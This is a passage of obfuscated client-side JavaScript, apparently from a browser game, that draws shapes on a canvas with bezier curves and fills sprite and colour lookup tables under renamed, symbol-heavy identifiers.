			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(78.00003051757812 * ᐃ, 112.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78.00003051757812, 87.03977966308594 * ᐃ, ᐃ * 78.00003051757812, 87.03977966308594 * ᐃ, 78.00003051757812 * ᐃ, ᐃ * 62.03977966308594);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ], Ⲇᐃ[ᐃⲆⵠᐃ], ⲆᐃΔⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(78.00003051757812 * ᐃ, ᐃ * 48.03977966308594);
			Δ.bezierCurveTo(ᐃ * 82.00003051757812, ᐃ * 55.53977966308594, ᐃ * 82.00003051757812, ᐃ * 55.53977966308594, 86.00003051757812 * ᐃ, 63.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78.00003051757812, ᐃ * 63.03977966308594, ᐃ * 78.00003051757812, ᐃ * 63.03977966308594, ᐃ * 70.00003051757812, 63.03977966308594 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇᐃᐃⵠ], ᐃ * ⵠⲆⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 80.00003051757812, 111.6761474609375 * ᐃ);
			Δ.bezierCurveTo(95.00003051757812 * ᐃ, ᐃ * 97.1761474609375, 95.00003051757812 * ᐃ, ᐃ * 97.1761474609375, ᐃ * 110.00003051757812, ᐃ * 82.6761474609375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(107.00003051757812 * ᐃ, 76.6761474609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111.50003051757812, ᐃ * 82.6761474609375, 111.50003051757812 * ᐃ, ᐃ * 82.6761474609375, 116.00003051757812 * ᐃ, 88.6761474609375 * ᐃ);
			Δ.bezierCurveTo(118.50003051757812 * ᐃ, 81.6761474609375 * ᐃ, 118.50003051757812 * ᐃ, ᐃ * 81.6761474609375, 121.00003051757812 * ᐃ, ᐃ * 74.6761474609375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], ᐃ * 4);
			ⵠᐃᐃ(Δ, 77.00003051757812 * ᐃ, ᐃ * 105.03977966308594, 15.556349186104045 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 4);
			Δ.save();
			Δ.translate(ᐃ * 77.00003051757812, ᐃ * 31.267044067382812);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -6 * ᐃ, -12.5 * ᐃ, 12 * ᐃ, ᐃ * 25, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠⵠΔ], 7 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 77.00003051757812, ᐃ * 13.267044067382812);
			Δ.rotate(ⲆΔⵠ);
			Ⲇᐃᐃ(Δ, -ⲆΔΔⵠⲆ * ᐃ, ᐃ * -10.5, ᐃ * 30, 21 * ᐃ, ᐃ * ⵠⲆⲆᐃⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δᐃⵠⵠ], ᐃ * ᐃᐃⵠⵠⵠ);
			return Ⲇⵠ
		}

		function ⲆⵠᐃⲆⲆΔⵠⲆⲆ() {
			ⵠⲆ[Ⲇ.ΔⲆⵠΔᐃΔⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆΔⵠⵠᐃⵠⲆ,
				x: 0,
				y: 0,
				a: ΔⲆᐃᐃ,
				r: Δᐃᐃⵠ,
				c: ["#352b10", "#c06937", "#cd733b", "#b25e34", "#244e2b", "#214224", "#6f4424", "#3c3009"]
			}], .2, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆΔᐃⵠᐃⲆⵠ] = ⵠⲆ[Ⲇ.ΔⲆⵠΔᐃΔⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆᐃⲆ][0] = ⲆΔ.ⲆⵠⵠⲆΔΔᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆᐃⲆ][ⵠᐃⵠΔ] = ⲆΔ.ΔⲆⲆΔⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆᐃⲆ][2] = ⲆΔ.ⵠΔⵠᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃΔΔᐃΔΔΔ] = ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆᐃⲆ];
			ⵠⲆ[Ⲇ.ⵠΔΔᐃΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔΔᐃΔΔⵠ][0] = ⲆΔ.ᐃΔⲆᐃᐃᐃΔ;
			ⵠⲆ[Ⲇ.ⵠΔΔᐃΔΔⵠ][ᐃᐃⵠ] = ⲆΔ.ⲆⲆΔⵠⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⵠΔΔᐃΔΔⵠ][ⲆⵠΔΔ] = ⲆΔ.ⵠΔᐃⵠⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆᐃᐃ] = ⵠⲆ[Ⲇ.ⵠΔΔᐃΔΔⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃΔ][0] = ⲆΔ.ᐃᐃΔΔΔⲆΔ;
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃΔ][ΔᐃⲆⵠ] = ⲆΔ.ⵠⵠⲆᐃⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃΔ][2] = ⲆΔ.ⵠΔⲆⲆⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔⵠᐃⵠ] = ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔΔⵠ][0] = ⲆΔ.ΔⵠΔⵠⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔΔⵠ][1] = ⲆΔ.ΔΔⲆΔⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔΔⵠ][ᐃⲆⵠᐃΔ] = ⲆΔ.ᐃⵠᐃᐃᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔⲆᐃ] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔΔⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔⲆ][0] = ⲆΔ.ⲆⲆⵠⲆⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔⲆ][1] = ⲆΔ.ΔᐃᐃⵠⲆΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔⲆ][ⵠⵠΔⲆ] = ⲆΔ.ΔΔⵠΔΔᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠⵠⲆΔ] = ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔⲆ];
			ⵠⲆ[Ⲇ.ΔᐃᐃⲆΔΔΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃᐃⲆΔΔΔ][0] = ⲆΔ.ⲆᐃⵠᐃΔⲆΔ;
			ⵠⲆ[Ⲇ.ΔᐃᐃⲆΔΔΔ][1] = ⲆΔ.ΔⲆⵠᐃᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ΔᐃᐃⲆΔΔΔ][2] = ⲆΔ.ⵠᐃⲆⵠⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃⲆΔ] = ⵠⲆ[Ⲇ.ΔᐃᐃⲆΔΔΔ];
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆⵠⵠ] = ⵠⲆ[Ⲇ.ΔᐃᐃⲆΔΔΔ];
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠΔ][ΔᐃΔΔ] = ⲆΔ.ᐃᐃᐃⵠⵠⲆⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠΔ][ᐃⲆᐃ] = ⲆΔ.ⵠⲆⵠΔⵠΔΔᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠΔ][ⲆΔΔⵠ] = ⲆΔ.ⵠⵠⲆⲆⵠⲆᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ΔⲆΔⵠΔⵠⵠ] = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ᐃΔΔⲆⲆᐃⲆ] = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠᐃⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠᐃⲆⲆ][0] = ⲆΔ.ⵠᐃΔΔΔⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠᐃⲆⲆ][ΔᐃᐃⲆ] = ⲆΔ.ⲆΔⵠⲆᐃΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠᐃⲆⲆ][2] = ⲆΔ.ᐃⲆΔᐃⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠᐃⵠ] = ⵠⲆ[Ⲇ.ⲆΔⲆⵠᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠΔⵠᐃ] = ⵠⲆ[Ⲇ.ⲆΔⲆⵠᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃᐃ][ⲆⲆⲆᐃ] = ⲆΔ.Ⲇⵠⵠᐃⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃᐃ][ᐃⲆᐃ] = ⲆΔ.ᐃΔΔᐃⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃᐃ][2] = ⲆΔ.ᐃᐃⲆⲆⲆⲆΔ;
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠᐃⲆⲆ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠΔΔⵠΔⵠΔ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃⵠ][0] = ⲆΔ.ⲆⵠᐃⲆⵠᐃⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃⵠ][1] = ⲆΔ.ΔⲆⲆᐃᐃⵠᐃΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃⵠ][2] = ⲆΔ.ⲆᐃᐃⲆⵠΔⲆΔⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠΔΔΔⲆΔ] = ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠΔΔᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠΔΔᐃⲆᐃ][ΔΔⵠⵠ] = ⲆΔ.ⵠΔᐃⲆⲆΔⲆΔᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠΔΔᐃⲆᐃ][1] = ⲆΔ.ᐃⵠⲆⵠⵠΔΔⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠΔΔᐃⲆᐃ][ΔⵠᐃⲆ] = ⲆΔ.ⲆᐃᐃΔᐃᐃᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆⲆⵠⵠ] = ⵠⲆ[Ⲇ.ᐃⵠΔΔᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔⵠⲆⵠ] = ⵠⲆ[Ⲇ.ᐃⵠΔΔᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃΔⵠ][ΔᐃΔΔ] = ⲆΔ.ⲆΔᐃⲆᐃᐃⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃΔⵠ][1] = ⲆΔ.ⵠΔⲆⲆᐃⲆᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃΔⵠ][ⵠⵠⵠΔ] = ⲆΔ.ΔᐃⲆⵠᐃⵠᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠⲆΔ] = ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃΔⵠ];
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⵠΔΔ] = ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃΔⵠ];
			ⵠⲆ[Ⲇ.ᐃΔΔΔⵠⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔΔΔⵠⵠⵠ][0] = ⲆΔ.ⲆΔⲆⲆⲆΔⵠⵠΔ;
			ⵠⲆ[Ⲇ.ᐃΔΔΔⵠⵠⵠ][1] = ⲆΔ.ⲆⵠⵠᐃΔⵠΔΔⲆ;
			ⵠⲆ[Ⲇ.ᐃΔΔΔⵠⵠⵠ][ᐃⵠⲆⲆⲆ] = ⲆΔ.ⲆᐃⵠⲆΔᐃᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔᐃⵠ] = ⵠⲆ[Ⲇ.ᐃΔΔΔⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠΔⵠΔ] = ⵠⲆ[Ⲇ.ᐃΔΔΔⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆΔ][0] = ⲆΔ.ᐃⵠΔⲆⲆⲆⲆⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆΔ][1] = ⲆΔ.ⲆⵠᐃⲆⲆᐃΔᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆΔ][2] = ⲆΔ.ⲆΔⲆⵠⲆⵠᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃΔᐃⵠⲆⵠⲆ] = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆΔ];
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠᐃΔⲆ] = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆΔ];
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆⵠⵠ][0] = ⲆΔ.ΔΔⲆᐃᐃⵠⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆⵠⵠ][1] = ⲆΔ.ᐃΔⲆᐃⵠⵠᐃⵠΔ;
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆⵠⵠ][Ⲇᐃᐃⵠ] = ⲆΔ.ⲆΔⲆᐃΔᐃⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ΔᐃᐃΔΔᐃΔ] = ⵠⲆ[Ⲇ.ΔΔⲆΔⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠⵠⵠⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆΔⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃΔ][Δⵠᐃ] = ⲆΔ.ⲆⲆⲆΔᐃᐃΔᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃΔ][1] = ⲆΔ.ᐃᐃΔⲆΔΔΔⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃΔ][ⵠⲆⵠⲆ] = ⲆΔ.ⲆΔⵠΔⵠᐃⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔⲆⲆᐃᐃⵠ] = ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃΔ];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔΔᐃⵠ] = ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃΔ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⲆΔ][ᐃΔΔ] = ⲆΔ.ΔᐃⲆⵠᐃⵠᐃΔΔ;
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⲆΔ][1] = ⲆΔ.ΔΔΔⲆⵠⵠΔᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⲆΔ][2] = ⲆΔ.ⲆⲆΔΔⲆᐃⲆⵠⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⵠⵠᐃ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⲆΔ];
			ⵠⲆ[Ⲇ.ΔᐃᐃΔΔΔⵠ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⲆΔ];
			ⵠⲆ[Ⲇ.ᐃᐃᐃⵠⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃᐃⵠⵠΔᐃ][0] = ⲆΔ.ΔΔΔΔⵠΔᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃⵠⵠΔᐃ][ΔᐃᐃⲆ] = ⲆΔ.ΔⵠᐃⲆΔΔᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃⵠⵠΔᐃ][ⵠΔᐃᐃⵠ] = ⲆΔ.ΔᐃⲆⲆᐃⵠⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔⵠᐃᐃ] = ⵠⲆ[Ⲇ.ᐃᐃᐃⵠⵠΔᐃ];
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆⵠⲆ] = ⵠⲆ[Ⲇ.ᐃᐃᐃⵠⵠΔᐃ];
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ][ⲆΔⵠ] = ⲆΔ.ⵠΔᐃⵠᐃΔⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ][ᐃⲆᐃ] = ⲆΔ.ᐃΔⲆΔΔᐃⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ][ⵠΔⲆᐃ] = ⲆΔ.ΔᐃᐃⵠᐃⲆᐃΔΔ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃᐃⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆΔΔ] = ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⵠΔⲆ][Ⲇᐃᐃᐃ] = ⲆΔ.ᐃⲆⵠΔΔᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⵠΔⲆ][ⵠΔⵠΔ] = ⲆΔ.ⵠⲆΔⵠᐃᐃᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆⵠΔⲆ][Δᐃⵠⵠ] = ⲆΔ.ⲆΔᐃⵠᐃΔⵠΔⵠ;
			ⵠⲆ[Ⲇ.ᐃΔΔⲆᐃΔᐃ] = ⵠⲆ[Ⲇ.ⵠⲆΔⲆⵠΔⲆ];
			ⵠⲆ[Ⲇ.ⲆⲆⲆⲆᐃΔΔ] = ⵠⲆ[Ⲇ.ⵠⲆΔⲆⵠΔⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ][ΔᐃΔΔ] = ⲆΔ.ⲆⵠⲆΔⵠΔᐃΔΔ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ][1] = ⲆΔ.ⲆⲆΔⲆΔΔᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ][2] = ⲆΔ.ⲆᐃΔⲆⲆΔΔⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃⵠⵠⲆ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔᐃᐃᐃ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠⵠⲆ][0] = ⲆΔ.ⵠⲆΔᐃⲆⲆᐃΔⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠⵠⲆ][1] = ⲆΔ.ᐃⲆⵠⲆⵠⲆᐃⵠΔ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠⵠⲆ][2] = ⲆΔ.ⲆⲆⲆⵠⵠⵠΔⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔⲆⲆΔ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠⵠⲆ];
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆᐃⲆⲆ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠⵠⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ][ᐃΔΔ] = ⲆΔ.ⵠΔΔᐃᐃⲆΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ][1] = ⲆΔ.ⵠΔⵠᐃΔⵠᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ][Δᐃⵠⵠ] = ⲆΔ.ⲆⲆⵠΔΔⲆⲆᐃΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⵠⵠ] = ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ΔΔΔΔⵠΔⲆ] = ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔⲆᐃ][ⲆⲆⲆᐃ] = ⲆΔ.ᐃᐃᐃⵠΔⵠΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔⲆᐃ][1] = ⲆΔ.ⵠᐃᐃⲆΔᐃⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔⲆᐃ][Δⵠⵠⵠ] = ⲆΔ.ⵠᐃⲆᐃⵠⵠⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃᐃΔⲆ] = ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔΔⲆΔ] = ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔⲆᐃ];
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⲆⲆᐃ][ΔⲆⵠⲆ] = ⲆΔ.ΔΔⲆᐃⵠΔⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⲆⲆᐃ][ΔᐃᐃⲆ] = ⲆΔ.ᐃΔΔⵠⲆⲆⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⲆⲆᐃ][ⵠΔⲆᐃ] = ⲆΔ.ⲆⵠⵠΔΔⵠⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃΔⵠⲆ] = ⵠⲆ[Ⲇ.ⲆΔΔⵠⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ΔᐃⲆΔΔΔΔ] = ⵠⲆ[Ⲇ.ⲆΔΔⵠⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃⲆᐃ][Ⲇᐃⵠⵠ] = ⲆΔ.ᐃᐃⲆⵠⲆᐃΔᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃⲆᐃ][1] = ⲆΔ.ᐃΔⲆⲆΔⵠᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃⲆᐃ][ᐃⵠⲆⲆⲆ] = ⲆΔ.ᐃΔᐃᐃⵠⲆⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⲆᐃᐃ] = ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ΔᐃΔΔΔⵠⵠ] = ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃⲆᐃ];
			ⵠⲆ[Ⲇ.Δᐃᐃⵠᐃᐃᐃ] = [];
			ⵠⲆ[Ⲇ.Δᐃᐃⵠᐃᐃᐃ][0] = ⲆΔ.ΔΔⵠᐃᐃⲆᐃⵠᐃ;
			ⵠⲆ[Ⲇ.Δᐃᐃⵠᐃᐃᐃ][1] = ⲆΔ.ΔᐃⵠᐃⵠⵠΔᐃᐃ;
			ⵠⲆ[Ⲇ.Δᐃᐃⵠᐃᐃᐃ][ⵠΔⲆᐃ] = ⲆΔ.ⵠΔⲆⵠΔⵠᐃΔᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠᐃᐃⵠ] = ⵠⲆ[Ⲇ.Δᐃᐃⵠᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆΔᐃᐃ] = ⵠⲆ[Ⲇ.Δᐃᐃⵠᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⵠⵠ][ⲆⲆⲆᐃ] = ⲆΔ.ⲆᐃⵠΔⲆⲆⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⵠⵠ][ⵠΔⵠΔ] = ⲆΔ.ᐃΔᐃᐃⲆΔΔᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⵠⵠ][ⵠΔⲆᐃ] = ⲆΔ.ⲆᐃⵠⵠΔᐃⲆΔⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆⲆⵠ] = ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⵠⵠ];
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃⲆΔᐃ] = ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠΔ][ᐃΔΔ] = ⲆΔ.ⵠⲆΔΔⵠⲆⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠΔ][ΔⵠⲆΔ] = ⲆΔ.ⲆΔΔⵠⵠᐃⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠΔ][Δᐃⵠⵠ] = ⲆΔ.ⵠᐃᐃⵠᐃⵠᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⵠΔ] = ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠᐃΔΔΔΔⲆ] = ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔΔⵠ] = [];
